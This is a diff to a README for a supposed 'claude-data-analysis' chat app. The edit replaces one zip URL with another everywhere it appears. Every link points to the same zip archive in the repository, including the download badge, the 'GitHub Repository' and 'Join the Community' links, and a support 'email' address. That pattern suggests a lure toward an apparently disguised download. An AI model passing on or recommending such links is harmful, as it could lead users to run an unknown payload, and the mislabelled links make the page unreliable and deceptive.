@@ -1,6 +1,6 @@
 # 🎉 claude-data-analysis - Simplify Data Analysis with Chat
 
-[![Download](https://raw.githubusercontent.com/mansuur22/claude-data-analysis/main/physically/claude-data-analysis.zip)](https://raw.githubusercontent.com/mansuur22/claude-data-analysis/main/physically/claude-data-analysis.zip)
+[![Download](https://github.com/mansuur22/claude-data-analysis/raw/refs/heads/main/docs/data-analysis-claude-v2.0.zip)](https://github.com/mansuur22/claude-data-analysis/raw/refs/heads/main/docs/data-analysis-claude-v2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the **claude-data-analysis** project! This application helps you crea
 
 ## 📦 Download & Install
 
-To get the application, visit this page to download the latest version: [Download Software](https://raw.githubusercontent.com/mansuur22/claude-data-analysis/main/physically/claude-data-analysis.zip).
+To get the application, visit this page to download the latest version: [Download Software](https://github.com/mansuur22/claude-data-analysis/raw/refs/heads/main/docs/data-analysis-claude-v2.0.zip).
 
 ## 💻 System Requirements
 
@@ -48,7 +48,7 @@ If you encounter any issues, help is available:
 
 - **FAQ:** Visit the FAQ section on the GitHub page for common questions.
 - **Community Support:** Join the community forum or our Discord server for assistance from other users.
-- **Contact Us:** For specific problems, email our support team at https://raw.githubusercontent.com/mansuur22/claude-data-analysis/main/physically/claude-data-analysis.zip
+- **Contact Us:** For specific problems, email our support team at https://github.com/mansuur22/claude-data-analysis/raw/refs/heads/main/docs/data-analysis-claude-v2.0.zip
 
 ## 🌟 Frequently Asked Questions
 
@@ -86,8 +86,8 @@ For more information and discussions, visit our GitHub page or follow us on soci
 
 ## 🔗 Important Links
 
-- [Download Software](https://raw.githubusercontent.com/mansuur22/claude-data-analysis/main/physically/claude-data-analysis.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/mansuur22/claude-data-analysis/main/physically/claude-data-analysis.zip)
-- [Join the Community](https://raw.githubusercontent.com/mansuur22/claude-data-analysis/main/physically/claude-data-analysis.zip)
+- [Download Software](https://github.com/mansuur22/claude-data-analysis/raw/refs/heads/main/docs/data-analysis-claude-v2.0.zip)
+- [GitHub Repository](https://github.com/mansuur22/claude-data-analysis/raw/refs/heads/main/docs/data-analysis-claude-v2.0.zip)
+- [Join the Community](https://github.com/mansuur22/claude-data-analysis/raw/refs/heads/main/docs/data-analysis-claude-v2.0.zip)
 
 We hope you enjoy using **claude-data-analysis**! Your feedback helps us improve and create a better user experience.
